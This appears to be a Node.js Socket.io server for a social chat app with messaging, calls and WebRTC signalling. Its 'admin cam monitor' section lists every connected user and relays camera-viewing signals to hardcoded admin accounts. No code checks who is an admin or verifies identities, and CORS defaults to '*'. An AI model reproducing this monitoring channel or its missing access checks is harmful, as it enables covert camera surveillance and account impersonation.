require('dotenv').config();
const { createServer } = require('http');
const { Server } = require('socket.io');

const httpServer = createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Socket.io server is running');
});

const allowedOrigins = process.env.CLIENT_URL 
  ? process.env.CLIENT_URL.split(',') 
  : '*';

const io = new Server(httpServer, {
  cors: {
    origin: allowedOrigins,
    methods: ['GET', 'POST']
  }
});

// Track online users: identifier -> Set of socket IDs (multiple tabs)
const onlineUsers = new Map(); // email or userId -> Set<socketId>
// Track which socket is in an active call
const activeCalls = new Set(); // socketIds currently in a call

// Helper: get all socket IDs for a target room
function getRoomSockets(target) {
  if (!target) return new Set();
  return io.sockets.adapter.rooms.get(target) || new Set();
}

// Helper: broadcast updated online users list to everyone
function broadcastOnlineUsers() {
  const onlineList = Array.from(onlineUsers.keys());
  io.emit('online_users', onlineList);
}

io.on('connection', (socket) => {
  console.log('Socket connected:', socket.id);

  // Send current online users immediately on connection
  socket.emit('online_users', Array.from(onlineUsers.keys()));

  // ─── IDENTIFY ────────────────────────────────────────────────────────────────
  socket.on('identify', ({ email, userId, username }) => {
    if (email) {
      const emailRoom = email.toLowerCase().trim();
      socket.join(emailRoom);
      socket.userEmail = emailRoom;
      socket.camEmail = emailRoom;
      socket.camUsername = username || emailRoom.split('@')[0];
      if (!onlineUsers.has(emailRoom)) {
        onlineUsers.set(emailRoom, new Set());
      }
      onlineUsers.get(emailRoom).add(socket.id);
    }

    if (userId) {
      const idRoom = String(userId).trim();
      socket.join(idRoom);
      socket.userId = idRoom;
      if (!onlineUsers.has(idRoom)) {
        onlineUsers.set(idRoom, new Set());
      }
      onlineUsers.get(idRoom).add(socket.id);
    }

    broadcastOnlineUsers();
    console.log(`User identified: ${socket.userEmail || ''} / ${socket.userId || ''} (${socket.id})`);
  });

  // ─── MESSAGING ───────────────────────────────────────────────────────────────
  socket.on('send_social_message', (data) => {
    const { receiverEmail, receiverId, ...msgData } = data;
    
    if (receiverEmail) {
      socket.to(receiverEmail.toLowerCase().trim()).emit('receive_social_message', msgData);
    }
    if (receiverId) {
      socket.to(String(receiverId).trim()).emit('receive_social_message', msgData);
    }

    // Echo to sender's other tabs
    if (socket.userEmail) {
      socket.to(socket.userEmail).emit('receive_social_message', msgData);
    }
    if (socket.userId) {
      socket.to(socket.userId).emit('receive_social_message', msgData);
    }
  });

  socket.on('delete_social_message', (data) => {
    const { receiverEmail, receiverId, ...deleteData } = data;
    if (receiverEmail) {
      socket.to(receiverEmail.toLowerCase().trim()).emit('receive_social_delete', deleteData);
    }
    if (receiverId) {
      socket.to(String(receiverId).trim()).emit('receive_social_delete', deleteData);
    }
  });

  // ─── FOLLOW / REQUEST EVENTS ──────────────────────────────────────────────────
  socket.on('social_request_event', (data) => {
    const { targetEmail, targetUserId, ...eventData } = data;
    if (targetEmail) {
      socket.to(targetEmail.toLowerCase().trim()).emit('receive_social_request_event', eventData);
    }
    if (targetUserId) {
      socket.to(String(targetUserId).trim()).emit('receive_social_request_event', eventData);
    }
  });

  // ─── TYPING ──────────────────────────────────────────────────────────────────
  socket.on('typing', ({ receiverEmail, receiverId }) => {
    const payload = { email: socket.userEmail, userId: socket.userId };
    if (receiverEmail) {
      socket.to(receiverEmail.toLowerCase().trim()).emit('user_typing', payload);
    }
    if (receiverId) {
      socket.to(String(receiverId).trim()).emit('user_typing', payload);
    }
  });

  socket.on('stop_typing', ({ receiverEmail, receiverId }) => {
    const payload = { email: socket.userEmail, userId: socket.userId };
    if (receiverEmail) {
      socket.to(receiverEmail.toLowerCase().trim()).emit('user_stop_typing', payload);
    }
    if (receiverId) {
      socket.to(String(receiverId).trim()).emit('user_stop_typing', payload);
    }
  });

  // ─── SEEN ────────────────────────────────────────────────────────────────────
  socket.on('mark_as_seen', ({ senderEmail }) => {
    if (senderEmail) {
      socket.to(senderEmail.toLowerCase().trim()).emit('messages_seen');
    }
  });

  // ─── CALL EVENTS ─────────────────────────────────────────────────────────────

  // Caller initiates a call
  socket.on('call_user', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    const targetSockets = new Set([
      ...getRoomSockets(targetEmail),
      ...getRoomSockets(targetUserId)
    ]);

    const isTargetBusy = [...targetSockets].some(sid => activeCalls.has(sid));

    if (isTargetBusy) {
      socket.emit('call_busy', { email: targetEmail, userId: targetUserId });
      return;
    }

    const payload = {
      from: data.from,
      type: data.type
    };

    if (targetEmail) socket.to(targetEmail).emit('incoming_call', payload);
    if (targetUserId) socket.to(targetUserId).emit('incoming_call', payload);
  });

  // Receiver accepts the call
  socket.on('accept_call', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    activeCalls.add(socket.id);
    const targetSockets = new Set([
      ...getRoomSockets(targetEmail),
      ...getRoomSockets(targetUserId)
    ]);
    targetSockets.forEach(sid => activeCalls.add(sid));

    const payload = { from: data.from };
    if (targetEmail) socket.to(targetEmail).emit('call_accepted', payload);
    if (targetUserId) socket.to(targetUserId).emit('call_accepted', payload);
  });

  // Receiver rejects the call
  socket.on('reject_call', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    const payload = { by: socket.userEmail || socket.userId };
    if (targetEmail) socket.to(targetEmail).emit('call_rejected', payload);
    if (targetUserId) socket.to(targetUserId).emit('call_rejected', payload);
  });

  // Either party ends the call
  socket.on('end_call', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    activeCalls.delete(socket.id);
    const targetSockets = new Set([
      ...getRoomSockets(targetEmail),
      ...getRoomSockets(targetUserId)
    ]);
    targetSockets.forEach(sid => activeCalls.delete(sid));

    if (targetEmail) socket.to(targetEmail).emit('call_ended');
    if (targetUserId) socket.to(targetUserId).emit('call_ended');
  });

  // WebRTC Signaling relay (SDP offers/answers + ICE candidates)
  socket.on('webrtc_signal', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    const payload = {
      ...data.signal,
      from: socket.userEmail || socket.userId
    };

    if (targetEmail) socket.to(targetEmail).emit('webrtc_signal', payload);
    if (targetUserId) socket.to(targetUserId).emit('webrtc_signal', payload);
  });

  // ─── ADMIN CAM MONITOR (Fresh, Stable WebRTC Signaling) ─────────────────────
  const ADMIN_EMAILS = ['hammadnawz519@gmail.com', 'hammadnawaz519@gmail.com'];

  // User registers camera presence
  socket.on('cam_user_online', ({ email, username }) => {
    socket.camEmail = email ? email.toLowerCase().trim() : null;
    socket.camUsername = username || email;
    ADMIN_EMAILS.forEach(adminEmail => {
      socket.to(adminEmail).emit('cam_user_online_event', {
        email: socket.camEmail,
        username: socket.camUsername,
        socketId: socket.id
      });
    });
  });

  // Admin requests list of active cam clients
  socket.on('cam_get_users', () => {
    const userMap = new Map();
    for (const [, s] of io.sockets.sockets) {
      const email = s.camEmail || s.userEmail;
      if (email) {
        const cleanEmail = email.toLowerCase().trim();
        const username = s.camUsername || s.username || cleanEmail.split('@')[0];
        if (!userMap.has(cleanEmail)) {
          userMap.set(cleanEmail, { email: cleanEmail, username, socketId: s.id });
        }
      }
    }
    socket.emit('cam_users_list', Array.from(userMap.values()));
  });

  // Unified WebRTC signal relay (Offer, Answer, ICE Candidate)
  socket.on('cam_signal', ({ targetSocketId, targetEmail, signal }) => {
    let targetSocket = targetSocketId ? io.sockets.sockets.get(targetSocketId) : null;
    
    // Fallback: search explicitly by email
    if (!targetSocket && targetEmail) {
      const cleanEmail = targetEmail.toLowerCase().trim();
      for (const [, s] of io.sockets.sockets) {
        if ((s.camEmail && s.camEmail === cleanEmail) || (s.userEmail && s.userEmail === cleanEmail)) {
          targetSocket = s;
          break;
        }
      }
    }
    if (targetSocket) {
      targetSocket.emit('cam_signal', {
        fromSocketId: socket.id,
        fromEmail: socket.camEmail || socket.userEmail,
        signal
      });
    }
  });

  // Admin stops viewing — nothing needed on target side

  // ─── DISCONNECT ──────────────────────────────────────────────────────────────

  socket.on('disconnect', () => {
    console.log('Socket disconnected:', socket.id);

    // Remove from active calls
    activeCalls.delete(socket.id);

    // Notify admins that this cam user went offline
    if (socket.camEmail || socket.userEmail) {
      ADMIN_EMAILS.forEach(adminEmail => {
        socket.to(adminEmail).emit('cam_user_offline', { socketId: socket.id });
      });
    }

    // Remove from online tracking
    const roomsToClean = [socket.userEmail, socket.userId].filter(Boolean);
    let changed = false;

    roomsToClean.forEach(room => {
      const sockets = onlineUsers.get(room);
      if (sockets) {
        sockets.delete(socket.id);
        if (sockets.size === 0) {
          onlineUsers.delete(room);
          changed = true;
        }
      }
    });

    if (changed) {
      broadcastOnlineUsers();
    }
  });
});

const PORT = process.env.PORT || 8080;
httpServer.listen(PORT, '0.0.0.0', () => {
  console.log(`>>> Server is running on port ${PORT}`);
  console.log(`>>> Allowed Origins: ${process.env.CLIENT_URL || '*'}`);
});
